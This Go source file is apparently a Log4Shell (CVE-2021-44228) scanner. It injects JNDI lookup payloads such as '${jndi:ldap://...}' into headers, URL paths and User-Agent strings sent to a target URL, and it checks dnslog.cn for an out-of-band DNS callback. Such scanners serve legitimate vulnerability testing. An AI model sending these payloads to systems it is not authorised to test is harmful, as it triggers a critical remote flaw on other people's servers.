package main

import (
	"bufio"
	flag "flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

const GETURL = "http://dnslog.cn/getdomain.php"
const FETCHURL = "http://dnslog.cn/getrecords.php"
const HEADPATH = "data/headers.txt"
const USERAGENT = "data/user-agents.txt"
const URLPATH = "data/urls.txt"

func ReadHeader(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func ReadPayloadBypassWAF()  {
	// TODO - Soon
}

func ReadPostReq()  {
	// TODO - Soon
}

func PostHttp()  {
	// TODO - Soon
}


func PayloadGetHttpUrl(url string) {
	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)

	}
	_, err = client.Do(req)
	if err != nil {
		fmt.Println("Please check you site is up or not : ", err)
		os.Exit(0)
	}
}

func PayloadGetHttp(url string, head string ,payload string) http.Header {
	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)

	}
	req.Header = http.Header{
		head: []string{payload},
	}
	_, err = client.Do(req)
	if err != nil {
		fmt.Println("Please check you site is up or not : ", err)
		os.Exit(0)
	}
	return req.Header
}

func GetHttpWithoutSession(url string) (string, string) {

	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return "", ""
	}
	res, err := client.Do(req)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return "", ""
	}
	body, err := io.ReadAll(res.Body)
	bodyStr := string(body)
	split := strings.Split(res.Header.Get("Set-Cookie"), "=")
	session := strings.Replace(split[1], "; path", "", 1)
	return bodyStr, session
}

func GetHttp(url string, session string) (string) {

	client := http.Client{}
	req , err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: session})
	res, err := client.Do(req)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	body, err := io.ReadAll(res.Body)
	if err != nil {
		fmt.Println("We have a error : ", err)
		return ""
	}
	bodyStr := string(body)
	return bodyStr
}

func HeaderScan(domain string, session string, url string)  {
	headers, err := ReadHeader(HEADPATH)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
		os.Exit(0)
	}
	for i, header := range headers {

		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("${jndi:ldap://%s/}", domain)
		payload_req := PayloadGetHttp(url, header ,payload)
		new_payload := fmt.Sprintf("%s:%s", header, payload_req.Get(header))
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload Header : ", new_payload)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload : ", new_payload)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload : ", new_payload)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}
}

func UrlsScan(domain string, session string, url string)  {

	urls, err := ReadHeader(URLPATH)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
		os.Exit(0)
	}

	for i, url_pattern := range urls {
		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("${jndi:ldap://%s/}", domain)
		new_url := fmt.Sprintf("%s%s%s", url, url_pattern, payload)
		PayloadGetHttpUrl(new_url)
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload URL : ", new_url)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload : ", new_url)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload : ", new_url)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}

}

func UserAgentScan(domain string, session string, url string)  {

	user_agents, err := ReadHeader(USERAGENT)
	if err != nil {
		log.Fatalf("Error to read file : %s", err)
		os.Exit(0)
	}
	for i, user_agent := range user_agents {

		fmt.Println("[+++] Your domain generated : " , domain)
		fmt.Println("[+++] Your session is : ", session)
		payload := fmt.Sprintf("%s${jndi:ldap://%s/}", user_agent ,domain)
		payload_req := PayloadGetHttp(url, "User-Agent" ,payload)
		new_payload := fmt.Sprintf("%s:%s", user_agent, payload_req.Get("User-Agent"))
		result := GetHttp(FETCHURL, session)
		if result == "" {
			fmt.Println("[***] Payload : ", new_payload)
			os.Exit(0)
		}
		if result == "[]" {
			fmt.Println("[***] Payload User-Agent : ", new_payload)
			fmt.Println("[---] Isn't to vulnerability CVE-2021-44228")
			fmt.Printf("#################### %v ############################", i)
			continue
		} else {
			fmt.Println("[***] Payload : ", new_payload)
			fmt.Println("[***] DNS log result : ", result)
			fmt.Println("[***] Is Vulnerability to CVE-2021-44228 - [critical]")
			os.Exit(0)
		}
	}

	PayloadGetHttp(url, "User-Agent", "Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT)${jndi:dns://vuaynl.dnslog.cn}")
}

func main()  {

	//var url string
	url := flag.String("url", "url", "a string")
	mode := flag.String("mode", "[urlpath, header, useragent]", "a string")

	flag.Parse()


	//progArg := os.Args

	//if len(progArg) >= 3 {
	//	fmt.Println("Usage : main.go url")
	//	os.Exit(0)
	//}
	domain, session :=  GetHttpWithoutSession(GETURL)
	// TODO - check is not null
	if *mode == "urlpath" {
		UrlsScan(domain, session, *url)
	}
	if *mode == "header" {
		HeaderScan(domain, session, *url)
	}
	if *mode == "useragent" {
		UserAgentScan(domain, session, *url)
	}
}
